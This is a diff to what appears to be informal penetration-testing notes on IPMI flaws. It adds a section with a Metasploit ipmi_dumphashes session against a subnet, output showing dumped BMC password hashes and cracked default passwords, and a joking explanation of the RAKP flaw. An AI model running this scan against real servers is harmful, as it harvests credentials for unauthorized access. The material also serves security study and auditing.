@@ -135,7 +135,38 @@ Hacker: Admin, Admin
 Server: Access granted!
 ```
 ## IPMI 2.0 RAKP Authentication Remote Password Hash Retrieval  (A: are you that serious?)
-tbc
+#### Exploiting with Metasploit
+```
+$ msfconsole
+ 
+      =[ metasploit v4.7.0-dev [core:4.7 api:1.0]
++ -- --=[ 1119 exploits - 638 auxiliary - 179 post
++ -- --=[ 309 payloads - 30 encoders - 8 nops
+ 
+msf> use auxiliary/scanner/ipmi/ipmi_dumphashes 
+msf auxiliary(ipmi_dumphashes) > set RHOSTS 10.0.0.0/24
+msf auxiliary(ipmi_dumphashes) > set THREADS 256
+msf auxiliary(ipmi_dumphashes) > run
+ 
+[+] 10.0.0.59 root:266ead5921000000....000000000000000000000000000000001404726f6f74:eaf2bd6a5 3ee18e3b2dfa36cc368ef3a4af18e8b
+[+] 10.0.0.59 Hash for user 'root' matches password 'calvin'
+[+] 10.0.0.59 :408ee18714000000d9cc....000000000000000000000000000000001400:93503c1b7af26abee 34904f54f26e64d580c050e
+[+] 10.0.0.59 Hash for user '' matches password 'admin'
+```
+Then if you have unknown hashes you just have to bruteforce them but don't was time doing that if you don't acctualy need a specific account on the system. Just becouse it will be a waste of time with so many critical vulnerabilities.
+
+#### How this works?
+
+In short, the authentication process for IPMI 2.0 mandates that the server send a salted SHA1 or MD5 hash of the requested user's password to the client, prior to the client authenticating. 
+
+You heard that right - the BMC will tell you the password hash for any valid user account you request. 
+```
+Hacker: I want to login!
+Server: Yes, please say your account and password! But here are all my accounts and MD5/SHA1 hashed passwords!
+Hacker: Thanks I will bruteforce those hashes in a second and I will return with a valid username and password!
+Server: OK!
+```
+
 ## IPMI Anonymous Authentication (B: yes)
 tbc
 ## Supermicro IPMI UPnP Vulnerability (A: Is it going to end now?)
